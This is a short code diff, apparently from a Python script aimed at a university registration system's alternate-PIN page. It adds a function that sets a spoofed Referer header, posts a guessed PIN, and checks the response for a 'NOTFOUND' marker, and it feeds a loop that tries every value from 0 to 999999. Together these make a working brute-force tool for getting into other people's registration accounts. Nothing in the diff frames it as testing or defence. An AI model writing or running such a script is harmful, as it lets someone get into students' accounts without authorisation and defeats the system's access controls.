@@ -35,7 +35,11 @@ def switch_term(term):
 
 
 def try_pin(pin):
-    """ """
+    req.headers['Referer'] = URL_ONLINE_SERVICES + 'bwskfreg.P_AltPin'
+    url = URL_ONLINE_SERVICES + 'bwskfreg.P_CheckAltPin'
+    res = req.post(url, {'pin': pin})
+
+    return res.content.find('getaltpinc NOTFOUND') < 0
 
 def bruteforce_pin():
     for i in range(0, 999999):
